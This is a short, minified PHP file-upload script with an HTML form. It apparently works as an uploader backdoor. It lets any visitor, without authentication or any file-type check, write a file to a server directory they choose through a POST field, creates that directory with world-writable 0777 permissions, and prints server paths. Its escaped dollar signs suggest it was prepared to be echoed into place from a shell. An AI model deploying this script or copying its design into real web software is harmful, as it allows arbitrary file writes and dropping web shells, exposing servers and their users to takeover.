<?php \$d=isset(\$_POST['upload_dir'])?\$_POST['upload_dir']:str_replace('\\\', '/', dirname(__FILE__)).'/';echo \$d;!file_exists(\$d)&&mkdir(\$d,0777,true);if(\$_SERVER['REQUEST_METHOD']=='POST'&&isset(\$_FILES['fileToUpload'])){\$f=\$d.basename(\$_FILES['fileToUpload']['name']);echo \$_FILES['fileToUpload']['size']>5e5?'Sorry, your file is too large.':(move_uploaded_file(\$_FILES['fileToUpload']['tmp_name'],\$f)?'The file '.basename(\$_FILES['fileToUpload']['name']).' has been uploaded to '.\$d:'Sorry, there was an error uploading your file.');}?><form action=\"<?=\$_SERVER['PHP_SELF']?>\" method=\"post\" enctype=\"multipart/form-data\">Select file to upload: <input type=\"file\" name=\"fileToUpload\">Upload directory (leave blank for default): <input type=\"text\" name=\"upload_dir\" placeholder=\"<?=dirname(__FILE__)?>/uploads/\"><input type=\"submit\" value=\"Upload File\"></form>